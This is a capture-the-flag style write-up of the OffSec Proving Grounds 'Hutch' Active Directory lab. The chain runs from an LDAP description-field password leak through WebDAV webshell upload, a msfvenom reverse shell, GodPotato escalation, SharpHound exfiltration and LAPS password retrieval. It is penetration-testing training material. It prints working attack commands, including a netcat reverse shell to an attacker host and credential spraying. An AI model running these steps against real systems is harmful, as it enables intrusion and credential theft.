
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Windows (Active Directory — domain `hutch.offsec`, DC `hutchdc`) **Difficulty:** Intermediate (community-rated Hard) **Initial Access:** Anonymous LDAP bind leaks a password in a user's `description` field → WebDAV file upload (authenticated) → ASPX webshell → `msfvenom` reverse shell binary execution **Privilege Escalation (local):** `SeImpersonatePrivilege` on the IIS AppPool identity → GodPotato → SYSTEM **Privilege Escalation (domain):** BloodHound reveals `ReadLAPSPassword` outbound control → NetExec LAPS module retrieves local admin password **Final Access:** Local Administrator via LAPS-retrieved credentials

### Key Techniques

- Full-port aggressive Nmap scan
- Recognizing a Domain Controller from its port signature
- WebDAV method enumeration via Nmap's `http-webdav-scan`
- `davtest` for anonymous WebDAV access testing (found auth-required)
- Anonymous LDAP querying (`ldapsearch`, root DSE, naming contexts)
- Targeted LDAP attribute queries (`sAMAccountName`, `description`)
- Credential-in-description-field discovery
- Password spraying across enumerated usernames (`nxc`)
- SMB share enumeration with recovered credentials
- Authenticated WebDAV testing (`davtest`, `cadaver`) for upload + execution capability
- ASPX webshell + `msfvenom`-generated reverse shell binary
- Post-foothold context enumeration (`whoami /priv`, groups)
- `SeImpersonatePrivilege` recognition on an IIS AppPool account
- GodPotato privilege escalation
- SharpHound collection (`-c All`)
- Ad-hoc file exfiltration via `impacket-smbserver`
- BloodHound analysis — marking owned principals, outbound object control edges
- LAPS abuse via NetExec's `laps` module

---

# Attack Path

```text
nmap -sV -sC -T4 -p- -Pn
        ↓
Port Signature (53, 88, 389, 445, 5985, ...) → Domain Controller
        ↓
Port 80: IIS + WebDAV (Risky Methods: PUT, PROPFIND, MKCOL, etc.)
        ↓
davtest (Anonymous) — Auth Required, No Access Yet
        ↓
ldapsearch (Anonymous Bind) — Root DSE, Naming Contexts, dnsHostName
        ↓
Add hutch.offsec / hutchdc to /etc/hosts
        ↓
ldapsearch — Query All Users, sAMAccountName + description
        ↓
Password Found in fmcsorley's description Field
        ↓
Try evil-winrm Directly — Fails
        ↓
Password Spray Across All Usernames (nxc) — No Additional Hits
        ↓
nxc smb --shares — Only Default Shares (IPC$, NETLOGON, SYSVOL)
        ↓
davtest (Authenticated as fmcsorley) — Upload + ASPX Execution Confirmed
        ↓
cadaver: Upload ASPX Webshell + msfvenom shell.exe
        ↓
Trigger shell.exe via Webshell
        ↓
Shell as iis apppool\defaultapppool
        ↓
whoami /priv — SeImpersonatePrivilege Present
        ↓
GodPotato + nc64.exe — SYSTEM (Local)
        ↓
Back to Low-Priv Context — Run SharpHound -c All
        ↓
impacket-smbserver: Exfil data.zip to Kali
        ↓
BloodHound Import — Mark fmcsorley as Owned
        ↓
Outbound Object Control: ReadLAPSPassword
        ↓
nxc ldap -M laps — Retrieve Local Administrator Password
        ↓
Authenticate as Local Administrator
```

---

# 1. Nmap Enumeration

```bash
sudo nmap -sV -sC -T4 -p- -Pn -oN nmap_hutch <target>
```

```text
53/tcp    domain    Simple DNS Plus
80/tcp    http      IIS 10.0 — WebDAV enabled (PUT, PROPFIND, MKCOL, LOCK, UNLOCK, COPY, MOVE, DELETE)
88/tcp    kerberos-sec
135/139/445  RPC / NetBIOS / SMB
389/3268  ldap      Domain: hutch.offsec, Site: Default-First-Site-Name
464       kpasswd5
593       ncacn_http (RPC over HTTP)
636/3269  tcpwrapped (LDAPS / GC over SSL)
5985      WinRM
9389      .NET Message Framing (AD Web Services)
49xxx     dynamic RPC ports
```

> [!tip] Recognition Pattern DNS (53) + Kerberos (88) + LDAP (389) appearing together is the standard signature of a Domain Controller — worth treating this port combination as an automatic trigger to set up `/etc/hosts` and prioritize LDAP enumeration, the same as any other AD box.

**The standout finding: WebDAV on port 80.** The `Potentially risky methods` list (`PUT`, `PROPFIND`, `MKCOL`, `LOCK`, `UNLOCK`, `COPY`, `MOVE`, `DELETE`) alongside Nmap's `http-webdav-scan` script confirms WebDAV is active — effectively exposing the web server as a network filesystem over HTTP.

> [!tip] Key Principle WebDAV enabled on IIS, especially with `PUT` and `MKCOL` in the allowed methods list, is a direct file-upload primitive once authenticated — treat its discovery the same way you'd treat any file-upload feature on a web app: as a strong candidate for the initial foothold, pending credentials.

UDP scan and gobuster were run but yielded nothing notable — omitted, but still worth running as standard practice on any box.

---

# 2. Initial WebDAV Check (Anonymous)

```bash
davtest -url http://<target>/
```

Anonymous access is **not permitted** — authentication required. Noted, and enumeration continues elsewhere rather than forcing this immediately.

---

# 3. LDAP Enumeration (Anonymous Bind)

## Root DSE query

```bash
ldapsearch -x -H ldap://<target> -s base
```

- `-x` — simple authentication (anonymous bind, no credentials)
- `-H` — LDAP URI
- `-s base` — search scope limited to the root object itself only, not one level deep or the full subtree

Full output is long — narrowed to specific attributes of interest:

```bash
ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -s base dnsHostName
```

Domain: `hutch.offsec` — Host: `hutchdc` (FQDN: `hutchdc.hutch.offsec`).

```bash
echo "<target_ip> hutch.offsec hutchdc.hutch.offsec" | sudo tee -a /etc/hosts
```

> [!tip] Recognition Pattern Anonymous LDAP bind — no credentials, no special tooling beyond `ldapsearch -x` — is worth trying as a standard step on every AD box before assuming authentication is required for any domain enumeration. Many domains still permit at least the root DSE and basic object queries anonymously.

## Querying user objects

```bash
ldapsearch -x -H ldap://<target> -b "dc=hutch,dc=offsec" "(objectClass=user)"
```

Full user objects return a wealth of attributes (`pwdLastSet`, `lastLogon`, `userPrincipalName`, etc.) — worth a full review, but narrowed here to the two highest-value fields:

```bash
ldapsearch -x -H ldap://<target> -b "dc=hutch,dc=offsec" "(objectClass=user)" sAMAccountName description
```

**Found: a plaintext password sitting in the `description` field of user `fmcsorley`.**

> [!warning] The `description` Field Is a Recurring Credential Leak Point Admins occasionally use the `description` attribute as an informal notes field — including, sometimes, a temporary or default password left there as a reminder. Always specifically query and read `description` alongside `sAMAccountName` when enumerating AD users via LDAP; it costs nothing extra and is a surprisingly common finding.

---

# 4. Testing the Credential

Port 5985 (WinRM) is open, so tried the most direct path first:

```bash
evil-winrm -i <target> -u fmcsorley -p 'CrabSharkJellyfish192'
```

**Failed** — the leaked credential doesn't grant WinRM access directly.

> [!tip] Key Principle Always try the most direct authenticated access method available (RDP, SSH, WinRM) with any newly-found credential before assuming it's dead — but a failure there doesn't mean the credential is wrong or useless, just that it isn't valid for _that particular_ access method/right.

## Password spraying

Built a username list from the LDAP user enumeration, sprayed the known password across all of them:

```bash
nxc smb <target> -u usernames.txt -p 'CrabSharkJellyfish192' --continue-on-success
```

No additional valid accounts found — the credential is only good for `fmcsorley`.

> [!tip] Key Principle Password spraying any newly discovered credential across every known username is a standard, low-cost step whenever new credential material is found in an AD environment — credential reuse across accounts is common enough to always be worth checking, even when the result here was negative.

## SMB enumeration with the known-good credential

```bash
nxc smb <target> -u fmcsorley -p 'CrabSharkJellyfish192' --shares
```

Only default shares (`IPC$`, `NETLOGON`, `SYSVOL`) with read access — nothing unusual, moved on to WebDAV.

---

# 5. Exploitation — Authenticated WebDAV Upload

```bash
davtest -url http://<target>/ -auth fmcsorley:CrabSharkJellyfish192
```

With valid credentials, `davtest` successfully:

- Creates a test directory (`MKCOL`)
- Uploads (`PUT`) files across many extensions (`.jsp`, `.cfm`, `.aspx`, `.txt`, `.shtml`, `.php`, `.pl`, `.cgi`, `.asp`, `.jhtml`, `.html`)
- Confirms **execution** specifically for `.aspx`, `.asp`, `.txt`, and `.html`

Since this is an IIS server, **`.aspx` execution succeeding** is the critical result — ASP.NET pages run server-side code, unlike `.txt`/`.html` which merely display as static content despite technically "succeeding" in davtest's test.

> [!tip] Recognition Pattern `davtest` tests many extensions indiscriminately, but only the ones matching the server's actual active scripting engine matter for RCE — on IIS, that's `.aspx`/`.asp`; on Apache with mod_php, that would be `.php`; etc. Read davtest's "Executes" summary against what you know about the server stack, not just as a raw list of successes.

## Uploading the payload

```bash
cadaver http://<target>/
```

`cadaver` behaves like an FTP client but for WebDAV — used to manually upload:

1. An ASPX webshell.
2. A `msfvenom`-generated reverse shell executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o shell.exe
```

Uploaded `shell.exe` to the web root, confirmed via directory listing, then triggered execution through the ASPX webshell (which provides command execution to run `shell.exe`).

```bash
nc -lvnp 443
```

Shell received.

---

# 6. Local Enumeration

```powershell
whoami
whoami /priv
whoami /groups
```

Running as **`iis apppool\defaultapppool`** — a default, normally low-privileged IIS application pool identity. Critically, it carries **`SeImpersonatePrivilege`**.

> [!tip] Recognition Pattern IIS AppPool identities frequently carry `SeImpersonatePrivilege` by design, since IIS itself needs to impersonate authenticated web clients for certain operations. This makes any IIS-hosted RCE a near-automatic candidate for a Potato-family privilege escalation — check `whoami /priv` immediately after landing any IIS-context shell.

---

# 7. Local Privilege Escalation — GodPotato

```powershell
# Transfer GodPotato-NET4.exe and nc64.exe to C:\Windows\Temp
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc64.exe -e cmd <attacker_ip> 443"
```

SYSTEM-level shell obtained.

> [!note] Not the End Goal Here Getting local SYSTEM on the DC is powerful, but this box's actual continuation goes back to a **domain-level** privesc path via BloodHound/LAPS rather than stopping at local SYSTEM — worth remembering that "got SYSTEM" on a single host isn't automatically "done" on an AD box; domain-wide objectives (other user credentials, other hosts, admin of the domain itself) may still be the real goal.

---

# 8. Domain Enumeration — BloodHound

Returned to the lower-privileged `fmcsorley` foothold context to collect AD data.

```powershell
.\SharpHound.exe -c All --ZipFileName data.zip
```

`-c All` collects the full available data set (sessions, ACLs, group memberships, trusts, GPOs, etc.) rather than a narrower collection method — appropriate for a first full sweep of the domain.

## Exfiltrating the collection

```bash
impacket-smbserver share . -smb2support -username jamesbond -password 007
```

Spins up an ad-hoc, authenticated SMB share directly from the current working directory on Kali — the target can then simply copy the SharpHound output to it, no separate upload channel needed.

```powershell
copy data.zip \\<attacker_ip>\share\
```

> [!tip] Key Principle `impacket-smbserver` works both directions — delivering tools _to_ a target (as seen in earlier notes) and receiving files _from_ a target, as here. A single lightweight ad-hoc SMB share covers both use cases whenever the target has native SMB client support (which Windows always does).

## Analysis in BloodHound

After importing `data.zip`, **mark every principal you actually control as "owned"** — in this case, just `fmcsorley`.

Inspecting `fmcsorley`'s node shows **1 outbound object control** edge: **`ReadLAPSPassword`** — meaning `fmcsorley` has explicit permission to read the LAPS-managed local administrator password for a specific computer object.

> [!tip] Recognition Pattern Always mark owned principals in BloodHound immediately after import — this is what unlocks BloodHound's "outbound object control" analysis, showing exactly what _your current position_ can do to other objects in the domain, rather than requiring manual graph traversal to find the same thing.

---

# 9. Privilege Escalation — LAPS Abuse

**LAPS** (Local Administrator Password Solution) rotates and centrally stores local administrator passwords in AD, readable only by principals explicitly granted the right (`ReadLAPSPassword` / `ms-Mcs-AdmPwd` read access).

Multiple valid tools exist for retrieving it (BloodHound suggests **bloodyAD**), but the fastest here was **NetExec's dedicated LAPS module**:

```bash
nxc ldap <target> -u fmcsorley -p 'CrabSharkJellyfish192' -M laps
```

Returns the current LAPS-managed local Administrator password directly via LDAP.

```bash
evil-winrm -i <target> -u Administrator -p '<laps_password>'
```

Authenticated as local Administrator.

> [!tip] Key Principle `ReadLAPSPassword` (or equivalent ACL rights on `ms-Mcs-AdmPwd`) found via BloodHound is a clean, direct privilege escalation path — no exploit needed, just the correct tool to read an attribute you already have rights to. NetExec's `-M laps` module is often the fastest single command for this once the right is confirmed.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|DNS + Kerberos + LDAP ports together|Domain Controller — set up `/etc/hosts`, prioritize LDAP enumeration|
|WebDAV methods (`PUT`, `MKCOL`, `PROPFIND`) visible on IIS|Strong candidate for file-upload RCE once authenticated|
|Anonymous LDAP bind possible|Query root DSE, naming contexts, and user objects before assuming creds are required|
|Enumerating AD user objects via LDAP|Always pull `description` alongside `sAMAccountName` — a common informal credential-leak field|
|A newly found credential fails against the most direct access method|Don't discard it — try password spraying and other services before concluding it's invalid|
|`davtest` confirms execution on multiple extensions|Cross-reference against the server's actual scripting engine (ASPX/ASP for IIS, PHP for Apache, etc.)|
|IIS-context shell landed|Check `whoami /priv` immediately — AppPool identities often carry `SeImpersonatePrivilege`|
|Got local SYSTEM on a DC|Don't assume the engagement is over — check for domain-level objectives via BloodHound|
|BloodHound data imported|Mark owned principals immediately to unlock outbound object control analysis|
|`ReadLAPSPassword` edge found|Use NetExec's `-M laps` module (or bloodyAD) for a direct, exploit-free privilege escalation|

---

# Key Lessons

> [!tip] Anonymous LDAP Is Worth Trying Before Assuming Authentication Is Required `ldapsearch -x` with no credentials frequently still permits root DSE and user object queries — always attempt this early on any AD box.

> [!tip] The `description` Field Is a Recurring, Low-Effort Credential Source Querying it alongside `sAMAccountName` costs nothing extra and is a surprisingly common way admins accidentally leave passwords readable to anyone who can bind to LDAP.

> [!tip] A Failed Login With a Valid Credential Isn't a Dead End Try the credential against other services and spray it across other usernames before concluding it's useless — it may simply not be valid for the specific access method first attempted.

> [!tip] WebDAV + IIS Execution Confirmation Should Match the Server's Actual Stack `davtest`'s raw "succeeds" list includes extensions that won't actually execute server-side on a given stack — focus on the ones matching the real scripting engine (ASPX/ASP for IIS).

> [!tip] IIS AppPool Shells Are a Near-Automatic SeImpersonatePrivilege Check Given how commonly IIS application pool identities carry this privilege, checking `whoami /priv` immediately after any IIS-context shell is close to a standing rule, not just good practice.

> [!tip] Local SYSTEM Isn't Always the Finish Line on an AD Box After any local privesc win on a domain-joined host, consider whether the real objective is domain-wide — BloodHound collection and analysis often reveals the actual intended path even after a local win is already in hand.

> [!tip] BloodHound's Outbound Object Control (After Marking Owned) Is a Fast Path to the Next Step Mark every controlled principal as owned immediately after import — it's what surfaces direct, ready-to-use privilege escalation edges like `ReadLAPSPassword` without manual graph digging.